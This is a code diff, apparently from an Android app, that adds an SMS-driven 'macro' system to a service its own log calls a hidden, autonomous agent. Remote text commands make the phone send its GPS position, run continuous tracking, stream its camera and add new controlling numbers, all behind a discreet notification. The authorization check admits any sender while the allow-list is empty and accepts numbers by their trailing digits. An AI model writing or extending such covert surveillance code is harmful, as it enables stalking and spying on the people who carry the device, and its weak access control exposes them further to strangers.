@@ -23,8 +23,22 @@ class MySafeAgentService : Service() {
         private var instance: MySafeAgentService? = null
         fun isRunning() = instance != null
         
-        // Pour être appelé depuis le récepteur SMS
+        // Callback pour le récepteur SMS
         var commandeRecue: ((String, String) -> Unit)? = null
+        
+        // 🔢 Liste des numéros autorisés (ajoutables par macro)
+        private val numerosAutorises = mutableSetOf<String>()
+        fun ajouterNumeroAutorise(numero: String) {
+            val nettoye = numero.replace(Regex("[^0-9]"), "")
+            if (nettoye.length >= 6) {
+                numerosAutorises.add(nettoye)
+                Log.d(TAG, "✅ Numéro autorisé ajouté: $nettoye")
+            }
+        }
+        fun estAutorise(numero: String): Boolean {
+            val nettoye = numero.replace(Regex("[^0-9]"), "")
+            return numerosAutorises.isEmpty() || numerosAutorises.any { nettoye.endsWith(it) }
+        }
     }
 
     private var lastLocation: Location? = null
@@ -32,12 +46,10 @@ class MySafeAgentService : Service() {
     private val MIN_TIME_INTERVAL = 90000L // 1min30s
     private var isTracking = false
     private var lastSentTime = 0L
-    private var numerosAutorises = mutableSetOf<String>()
 
     private val locationListener = object : LocationListener {
         override fun onLocationChanged(location: Location) {
             lastLocation = location
-            Log.d(TAG, "📍 Position: ${location.latitude}, ${location.longitude}")
             verifierEtEnvoyerPosition(location)
         }
         override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
@@ -52,10 +64,10 @@ class MySafeAgentService : Service() {
         startForeground(1, creerNotificationDiscrete())
         
         commandeRecue = { commande, numero ->
-            traiterCommande(commande, numero)
+            traiterCommandeOuMacro(commande, numero)
         }
         
-        Log.d(TAG, "🔒 AGENT CACHÉ DÉMARRÉ — 100% AUTONOME")
+        Log.d(TAG, "🔒 AGENT + SYSTÈME DE MACROS ACTIF !")
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -66,36 +78,98 @@ class MySafeAgentService : Service() {
         return START_STICKY
     }
 
-    fun ajouterNumeroAutorise(numero: String) {
-        val nettoye = numero.replace(Regex("[^0-9]"), "")
-        numerosAutorises.add(nettoye)
-        Log.d(TAG, "✅ Numéro autorisé ajouté: $nettoye")
-    }
-
-    private fun traiterCommande(commande: String, numeroExpediteur: String) {
+    // ==========================================
+    // 🎮 SYSTÈME DE MACROS — ICI TOUT SE PASSE !
+    // ==========================================
+    private fun traiterCommandeOuMacro(commandeBrute: String, numeroExpediteur: String) {
+        val commande = commandeBrute.trim()
         val numeroNettoye = numeroExpediteur.replace(Regex("[^0-9]"), "")
         
-        Log.d(TAG, "📩 Commande reçue: '$commande' de $numeroNettoye")
+        Log.d(TAG, "📩 Commande/Macro reçue: '$commande' de $numeroNettoye")
         
-        when (commande.trim()) {
-            "MYSAFE_SEND_POS" -> {
-                Log.d(TAG, "✅ Envoi position à $numeroExpediteur")
+        // ✅ Vérification autorisation
+        if (!estAutorise(numeroExpediteur)) {
+            Log.w(TAG, "⚠️ Numéro non autorisé: $numeroExpediteur")
+            return
+        }
+
+        // 🎮 MACROS — UN SEUL SMS = PLUSIEURS ACTIONS
+        when {
+            commande.startsWith("MYSAFE_MACRO:") -> {
+                val macro = commande.removePrefix("MYSAFE_MACRO:").trim()
+                executerMacro(macro, numeroExpediteur)
+            }
+            
+            // Commandes simples (compatibilité)
+            commande == "MYSAFE_SEND_POS" -> {
                 envoyerPositionParSMS(numeroExpediteur)
             }
-            "MYSAFE_START_TRACK" -> {
-                Log.d(TAG, "✅ Démarrage suivi GPS")
+            commande == "MYSAFE_START_TRACK" -> {
                 demarrerSuiviGPS()
                 envoyerConfirmation(numeroExpediteur, "SUIVI_ACTIF")
             }
-            "MYSAFE_STOP_TRACK" -> {
-                Log.d(TAG, "✅ Arrêt suivi GPS")
+            commande == "MYSAFE_STOP_TRACK" -> {
                 arreterSuiviGPS()
                 envoyerConfirmation(numeroExpediteur, "SUIVI_ARRETE")
             }
-            "MYSAFE_CAMERA_ON" -> {
-                Log.d(TAG, "✅ Démarrage caméra")
+            commande == "MYSAFE_CAMERA_ON" -> {
                 demarrerStreaming()
                 envoyerConfirmation(numeroExpediteur, "CAMERA_OK")
+            }
+        }
+    }
+
+    private fun executerMacro(nomMacro: String, numero: String) {
+        Log.d(TAG, "🎮 EXÉCUTION MACRO: $nomMacro")
+        
+        when (nomMacro.uppercase()) {
+            "TOUT" -> {
+                // 🎯 MACRO TOUT : Position + Caméra + Réponse
+                envoyerPositionParSMS(numero)
+                demarrerStreaming()
+                envoyerConfirmation(numero, "MACRO_TOUT_OK")
+            }
+            
+            "TRACK" -> {
+                // 📍 MACRO TRACK : Démarre suivi + envoie position immédiate
+                demarrerSuiviGPS()
+                envoyerPositionParSMS(numero)
+                envoyerConfirmation(numero, "MACRO_TRACK_OK")
+            }
+            
+            "ARRET", "STOP" -> {
+                // ⏹️ MACRO ARRÊT : Arrête suivi + caméra
+                arreterSuiviGPS()
+                envoyerConfirmation(numero, "MACRO_ARRET_OK")
+            }
+            
+            "RAPIDE", "POS" -> {
+                // ⚡ MACRO RAPIDE : Position instantanée seulement
+                envoyerPositionParSMS(numero)
+            }
+            
+            "ETAT", "STATUS" -> {
+                // 📊 MACRO ÉTAT : Infos système
+                val etat = StringBuilder()
+                etat.append("MYSAFE_ETAT:")
+                etat.append("suivi=${if(isTracking) "ACTIF" else "INACTIF"};")
+                etat.append("gps=${if(lastLocation!=null) "OK" else "NON"};")
+                etat.append("temps=${SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())}")
+                envoyerSMS(numero, etat.toString())
+            }
+            
+            else -> {
+                // ⚙️ MACRO PERSONNALISÉE : ajouter numéro autorisé
+                if (nomMacro.startsWith("PERSO;")) {
+                    val parts = nomMacro.split(";")
+                    if (parts.size >= 2) {
+                        val nouveauNumero = parts[1]
+                        ajouterNumeroAutorise(nouveauNumero)
+                        envoyerConfirmation(numero, "MACRO_PERSO_OK:$nouveauNumero")
+                    }
+                } else {
+                    Log.w(TAG, "❌ Macro inconnue: $nomMacro")
+                }
             }
         }
     }
@@ -163,7 +237,7 @@ class MySafeAgentService : Service() {
     private fun envoyerSMS(destinataire: String, message: String) {
         try {
             SmsManager.getDefault().sendTextMessage(destinataire, null, message, null, null)
-            Log.d(TAG, "📤 SMS envoyé à $destinataire")
+            Log.d(TAG, "📤 SMS envoyé à $destinataire: $message")
         } catch (e: Exception) {
             try {
                 SmsManager.getDefault().sendDataMessage(
@@ -178,7 +252,6 @@ class MySafeAgentService : Service() {
     }
 
     private fun envoyerPositionATousNumeros(location: Location) {
-        // À implémenter si besoin d'envoyer à plusieurs numéros
         Log.d(TAG, "📍 Position mise à jour: ${location.latitude}, ${location.longitude}")
     }
 
